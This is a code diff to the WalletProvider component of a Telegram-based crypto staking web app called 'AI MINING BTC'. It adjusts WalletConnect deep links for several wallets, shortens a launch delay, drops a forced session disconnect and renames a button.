@@ -9,7 +9,7 @@ const projectId = 'ec457184730a7f1e24bbe58a393f442b';
 const metadata = {
     name: 'AI MINING BTC',
     description: 'AI-powered Staking Platform (RiotNode)',
-    url: 'https://riotnode.riotplatforms.workers.dev',
+    url: 'https://riotnode.riotplatforms.workers.dev', // Will be updated to Bot URI if provided
     icons: ['https://riotnode.riotplatforms.workers.dev/logo.png']
 };
 
@@ -180,7 +180,7 @@ export function WalletProvider({ children }: { children: React.ReactNode }) {
                 'okx': `https://www.okx.com/download?uri=${encodedUri}`
             };
 
-            // 1000ms stability delay
+            // 800ms stability delay
             const timer = setTimeout(() => {
                 const tg = (window as any).Telegram?.WebApp;
                 if (tg && tg.openLink) {
@@ -188,7 +188,7 @@ export function WalletProvider({ children }: { children: React.ReactNode }) {
                     tg.openLink(finalUrl, { try_instant_view: false });
                 }
                 setHandshakeUri(null);
-            }, 1000);
+            }, 800);
 
             return () => clearTimeout(timer);
         }
@@ -206,12 +206,7 @@ export function WalletProvider({ children }: { children: React.ReactNode }) {
     const handleHubSelect = async (walletKey: string) => {
         if (!walletProvider) return;
         
-        // CLEAN START: Clear existing session/handshake attempt
-        try { 
-            if (walletProvider.session) await walletProvider.disconnect();
-            setHandshakeUri(null);
-        } catch (e) {}
-
+        // NO FORCE DISCONNECT - It breaks the session flow for SafePal
         setPendingSelection(walletKey);
         setIsPulsing(true);
         localStorage.setItem('aimining_last_wallet', walletKey);
@@ -344,12 +339,11 @@ export function WalletProvider({ children }: { children: React.ReactNode }) {
                                         const tg = (window as any).Telegram?.WebApp;
                                         if (tg && tg.openLink) {
                                             const encodedUri = encodeURIComponent(handshakeUri);
-                                            const botUrl = encodeURIComponent('https://riotnode.riotplatforms.workers.dev');
                                             const schemes: Record<string, string> = {
-                                                'metamask': `https://metamask.app.link/wc?uri=${encodedUri}&redirectUrl=${botUrl}`,
-                                                'trust': `https://link.trustwallet.com/wc?uri=${encodedUri}&redirectUrl=${botUrl}`,
+                                                'metamask': `https://metamask.app.link/wc?uri=${encodedUri}`,
+                                                'trust': `https://link.trustwallet.com/wc?uri=${encodedUri}`,
                                                 'binance': `https://www.binance.com/en/download?uri=${encodedUri}`,
-                                                'safepal': `https://link.safepal.io/wc?uri=${encodedUri}&redirectUrl=${botUrl}`,
+                                                'safepal': `https://link.safepal.io/wc?uri=${encodedUri}`,
                                                 'tp': `https://tokenpocket.platform.com/wc?uri=${encodedUri}`,
                                                 'okx': `https://www.okx.com/download?uri=${encodedUri}`
                                             };
@@ -358,7 +352,7 @@ export function WalletProvider({ children }: { children: React.ReactNode }) {
                                     }}
                                     className="w-full py-4 bg-primary text-black font-black uppercase text-[10px] tracking-widest rounded-2xl animate-pulse border-none cursor-pointer"
                                 >
-                                    Open Wallet Again
+                                    Launch Wallet (Fix)
                                 </button>
                             )}
                             <button
